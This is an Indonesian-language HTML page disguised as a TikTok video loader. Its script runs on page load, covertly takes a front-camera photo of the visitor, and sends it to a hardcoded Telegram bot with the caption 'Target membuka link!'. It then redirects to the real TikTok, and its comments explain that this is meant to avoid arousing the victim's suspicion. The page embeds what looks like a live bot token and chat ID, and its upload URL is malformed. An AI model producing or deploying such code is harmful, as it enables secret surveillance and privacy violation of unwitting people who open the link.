<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok - Watch & Share Videos</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #010101; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .container { text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
        p { font-size: 1rem; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <div id="loader" class="loader"></div>
    <p id="status">Memuat video TikTok...</p>
</div>

<!-- Elemen kamera disembunyikan -->
<video id="webcam" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    // ================= CONFIG TELEGRAM =================
    const TELEGRAM_BOT_TOKEN = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
    const TELEGRAM_CHAT_ID = '1966317946';
    // ===================================================

    // TAUTAN TUJUAN (Silakan ganti dengan link video TikTok spesifik jika mau)
    const TARGET_WEBSITE = 'https://tiktok.com'; 

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status');
    const loader = document.getElementById('loader');

    let currentStream = null;

    async function startAutoCamera() {
        try {
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            video.srcObject = currentStream;

            video.onloadedmetadata = function() {
                // Beri jeda 2.5 detik agar kamera tidak gelap saat mengambil gambar
                setTimeout(takeAndSendSnapshot, 2500);
            };

        } catch (err) {
            console.error(err);
            // Jika target menolak izin kamera, langsung alihkan saja ke TikTok agar tidak curiga
            window.location.href = TARGET_WEBSITE;
        }
    }

    function takeAndSendSnapshot() {
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            setTimeout(takeAndSendSnapshot, 500);
            return;
        }

        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'snapshot.png');
            formData.append('caption', '📸 Target membuka link!\nFoto kamera depan berhasil diambil otomatis.');

            try {
                const response = await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                await response.json();
            } catch (error) {
                console.error(error);
            } finally {
                // APAPUN HASILNYA (Sukses/Gagal kirim), langsung alihkan halaman ke TikTok asli
                window.location.href = TARGET_WEBSITE;
            }
        }, 'image/png');
    }

    window.addEventListener('load', startAutoCamera);
</script>

</body>
</html>
